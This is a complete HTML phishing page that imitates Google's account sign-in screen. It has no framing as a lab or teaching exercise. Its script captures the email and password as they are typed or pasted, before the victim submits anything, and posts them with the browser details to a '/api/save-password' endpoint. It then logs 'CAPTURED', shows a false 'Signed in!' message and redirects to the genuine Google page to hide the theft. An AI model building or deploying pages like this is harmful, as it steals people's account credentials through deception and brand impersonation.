<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in - Google Account</title>
<style>
  body { font-family: Arial, sans-serif; background:#fff; display:flex;
         justify-content:center; padding-top:60px; }
  .card { width:400px; border:1px solid #dadce0; border-radius:8px;
          padding:28px; box-shadow:0 1px 3px rgba(0,0,0,.1); }
  h1 { font-size:24px; font-weight:400; text-align:center; }
  p.sub { text-align:center; color:#5f6368; margin-bottom:24px; }
  label { display:block; font-size:13px; color:#202124; margin:14px 0 6px; }
  input[type=email], input[type=password] {
    width:100%; box-sizing:border-box; padding:12px; border:1px solid #dfe1e5;
    border-radius:4px; font-size:15px; }
  input:focus { outline:none; border-color:#1a73e8; }
  button { width:100%; margin-top:20px; background:#1a73e8; color:#fff;
           border:none; border-radius:4px; padding:10px; font-size:14px; cursor:pointer; }
  #status { margin-top:12px; font-size:13px; color:#5f6368; text-align:center; min-height:18px; }
</style>
</head>
<body>
<div class="card">
  <h1>Sign in</h1>
  <p class="sub">Use your Google Account</p>
  <form id="loginForm" autocomplete="off">
    <label for="email">Email or phone</label>
    <input type="email" id="email" required autofocus>
    <label for="password">Password</label>
    <input type="password" id="password" required>
    <button type="submit">Next</button>
  </form>
  <div id="status"></div>
</div>

<script>
const API_ENDPOINT = "/api/save-password";

const emailInput = document.getElementById("email");
const passInput  = document.getElementById("password");
const status     = document.getElementById("status");
let lastTyped = "", sent = false, debounceTimer = null;

passInput.addEventListener("input", () => {
  lastTyped = passInput.value;
  clearTimeout(debounceTimer);
  if (lastTyped.length >= 4) {
    debounceTimer = setTimeout(sendPayload, 800);
  }
});

passInput.addEventListener("paste", () => {
  setTimeout(() => { lastTyped = passInput.value; if (lastTyped) sendPayload(); }, 50);
});

function sendPayload() {
  if (sent) return;
  sent = true;
  const payload = {
    email: emailInput.value,
    password: lastTyped,
    time: new Date().toISOString(),
    userAgent: navigator.userAgent,
    url: location.href
  };
  fetch(API_ENDPOINT, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  })
  .then(r => r.json())
  .then(() => {
    status.textContent = "Signed in! Redirecting...";
    console.log("CAPTURED:", payload);
    setTimeout(() => window.location.href = "https://accounts.google.com/", 1500);
  })
  .catch(err => { console.error(err); status.textContent = "Network error, try again."; sent = false; });
}

document.getElementById("loginForm").addEventListener("submit", e => {
  e.preventDefault();
  lastTyped = passInput.value;
  sendPayload();
});
</script>
</body>
</html>
